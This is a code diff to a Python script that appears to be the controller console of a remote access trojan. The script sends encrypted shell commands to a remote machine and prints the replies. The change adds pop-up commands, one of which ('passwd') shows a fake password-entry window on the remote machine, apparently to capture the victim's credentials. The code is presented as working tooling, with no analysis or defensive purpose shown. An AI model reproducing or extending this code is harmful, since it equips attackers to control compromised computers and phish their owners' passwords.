@@ -49,8 +49,31 @@ def main():
                 command="CMD:"+input(f"{Fore.LIGHTCYAN_EX}{socket.gethostname()}@{path}$ ")
                 if "exit" in command.lower():
                     exit()
-                send(irc, command)
-                rep=key.decrypt(irc.recv(10024).decode().split("REP:")[-1].encode()).decode().strip()
-                print("\n" + rep)
+                elif "popup" in command or "POPUP" in command :
+                    # command=command.replace(" ",":").lower().replace("popup" , "POPUP").replace("cmd:" , "")
+                    command=list(filter(None , command.split(" ")))
+                    command = ("POPUP:" + command[1]+ " ".join(command[2:len(command)])).replace('"' , ":").replace("'" , ":")
+                if command.lower() == "popup:help":
+                    print(f"""{Fore.LIGHTGREEN_EX}POPUP hlep : 
+Alert window : popup alert "[popup text]" "[popup title]"
+
+Confirm window : popup confr "[popup text]" "[popup title]" "[popup buttons  (split with ,)]"
+
+Question window : popup qstion "[popup text]" "[popup title]"
+
+Password window : popup passwd "[popup text]" "[popup title]"
+
+Examples : 
+Alert window : popup alert "this is my text" "this is title"
+Confirm window : popup confr "this is my text" "this is title" "button1,button2,button3"
+Question window : popup qstion "this is my text" "this is title"
+Password window : popup passwd "this is my text" "this is title"
+
+{Fore.LIGHTRED_EX}Note : Do not forget the " signs .{Fore.RESET}
+""")
+                else:
+                    send(irc, command)    
+                    rep=key.decrypt(irc.recv(10024).decode().split("REP:")[-1].encode()).decode().strip()
+                    print("\n" + rep)
         except: 
             pass
